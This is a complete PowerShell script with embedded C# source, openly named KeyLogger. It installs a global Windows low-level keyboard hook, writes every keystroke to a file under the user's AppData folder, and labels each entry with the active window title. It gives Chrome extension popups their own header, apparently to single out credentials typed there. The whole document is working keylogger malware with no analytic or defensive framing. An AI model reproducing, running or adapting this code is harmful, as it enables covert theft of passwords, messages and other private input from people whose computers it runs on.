Add-Type -AssemblyName System.Windows.Forms

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
    public static class Program {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static readonly string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static readonly string logDir = Path.Combine(appDataPath, "J");
        private static readonly string logFileName = Path.Combine(logDir, "logs.txt");

        private static StreamWriter logFile;
        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;

        private static string currentContextKey = "";

        public static void Main() {
            // Ensure directory exists
            if (!Directory.Exists(logDir))
                Directory.CreateDirectory(logDir);

            logFile = File.AppendText(logFileName);
            logFile.AutoFlush = true;
            hookId = SetHook(hookProc);
            Application.Run();
            UnhookWindowsHookEx(hookId);
            logFile.Close();
        }

        private static IntPtr SetHook(HookProc proc) {
            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, moduleHandle, 0);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);

                WindowInfo windowInfo = GetActiveWindowInfo();

                string newContextKey = windowInfo.Title + "::" + windowInfo.ClassName;

                if (newContextKey != currentContextKey) {
                    currentContextKey = newContextKey;
                    string header = windowInfo.Title;

                    // If title unknown and class matches extension popup classes, use special header
                    if (windowInfo.Title == "Unknown") {
                        string[] chromeExtensionClasses = new string[] { "Chrome_WidgetWin_1", "ExtensionPopup" };
                        foreach (string extClass in chromeExtensionClasses) {
                            if (string.Compare(windowInfo.ClassName, extClass, true) == 0) {
                                header = "CHROME EXTENSION";
                                break;
                            }
                        }
                    }

                    logFile.WriteLine();
                    logFile.WriteLine("----- " + header + " -----");
                }

                string keyString = ConvertKeyToString(vkCode);

                if (!string.IsNullOrEmpty(keyString)) {
                    logFile.Write(keyString);
                }
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private struct WindowInfo {
            public string Title;
            public string ClassName;
        }

        private static WindowInfo GetActiveWindowInfo() {
            IntPtr hwnd = GetForegroundWindow();
            if (hwnd == IntPtr.Zero)
                return new WindowInfo { Title = "Unknown", ClassName = "" };

            uint processId;
            GetWindowThreadProcessId(hwnd, out processId);
            string title = "";
            string className = GetClassName(hwnd);

            if (processId != 0) {
                try {
                    Process p = Process.GetProcessById((int)processId);
                    title = p.MainWindowTitle;
                    if (string.IsNullOrEmpty(title)) {
                        title = p.ProcessName;
                    }
                } catch {
                    title = "Unknown";
                }
            }
            if (string.IsNullOrEmpty(title)) title = "Unknown";
            if (className == null) className = "";

            return new WindowInfo { Title = title, ClassName = className };
        }

        private static string ConvertKeyToString(int vkCode) {
            bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0; // VK_SHIFT
            bool capsLockOn = (GetKeyState(0x14) & 0x0001) != 0;   // VK_CAPITAL

            if (vkCode >= 0x41 && vkCode <= 0x5A) { // A-Z
                char c = (char)vkCode;
                bool upper = capsLockOn ^ shiftPressed;
                return upper ? c.ToString() : c.ToString().ToLower();
            }
            if (vkCode >= 0x30 && vkCode <= 0x39) { // Numbers 0-9
                if (shiftPressed) {
                    return ShiftNumberToSymbol((char)vkCode);
                } else {
                    return ((char)vkCode).ToString();
                }
            }
            if (vkCode >= 0x60 && vkCode <= 0x69) { // Numpad 0-9
                return (vkCode - 0x60).ToString();
            }

            switch (vkCode) {
                case 0x20: return " ";
                case 0x0D: return Environment.NewLine;
                case 0x09: return "\t";
                case 0x14: return null;
                case 0xBD: return shiftPressed ? "_" : "-";
                case 0xBB: return shiftPressed ? "+" : "=";
                case 0xDB: return shiftPressed ? "{" : "[";
                case 0xDD: return shiftPressed ? "}" : "]";
                case 0xDC: return shiftPressed ? "|" : "\\";
                case 0xBA: return shiftPressed ? ":" : ";";
                case 0xDE: return shiftPressed ? "\"" : "'";
                case 0xBC: return shiftPressed ? "<" : ",";
                case 0xBE: return shiftPressed ? ">" : ".";
                case 0xBF: return shiftPressed ? "?" : "/";
                case 0xC0: return shiftPressed ? "~" : "`";
                default: return null;
            }
        }

        private static string ShiftNumberToSymbol(char number) {
            switch (number) {
                case '1': return "!";
                case '2': return "@";
                case '3': return "#";
                case '4': return "$";
                case '5': return "%";
                case '6': return "^";
                case '7': return "&";
                case '8': return "*";
                case '9': return "(";
                case '0': return ")";
                default: return number.ToString();
            }
        }

        private static string GetClassName(IntPtr hwnd) {
            const int maxlength = 256;
            StringBuilder classText = new StringBuilder(maxlength);
            if (GetClassName(hwnd, classText, maxlength) > 0) {
                return classText.ToString();
            }
            return "";
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Main()
